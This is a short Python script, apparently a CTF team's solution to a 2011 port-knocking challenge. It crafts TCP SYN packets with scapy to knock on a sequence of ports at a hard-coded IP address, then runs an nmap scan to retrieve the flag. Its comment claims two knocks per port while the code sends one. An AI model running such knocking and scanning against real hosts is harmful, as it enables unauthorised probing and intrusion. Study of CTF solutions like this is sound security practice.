#!/usr/bin/python
# sheldon.py
# EINDBAZEN solution to port knocking challenge PHD CTF Quals 2011
 
# Import scapy
from scapy.all import *
conf.verb = 0
# Ports
ports = [44, 91, 2, 7, 66]
# Knock twice on every port
for dport in range(0, len(ports)):
    print "[*] Knocking on 107.170.112.218: " , ports[dport]
    ip = IP(dst="107.170.112.218")
    port = 39367
    SYN = ip/TCP(sport=port, dport=ports[dport], flags="S", window=2048, options=[('MSS',1460)], seq=0)
    send(SYN) ; print "*KNOCK*"
    print "PENNY"
# Use NMAP for scanning for open ports
# We also use -sV, so nmap connects to the port and get the flag
print "[*] Scanning for open ports using nmap"
subprocess.call("nmap -sS -sV -T4 -p 22,53,80,21,20,443 107.170.112.218", shell=True)
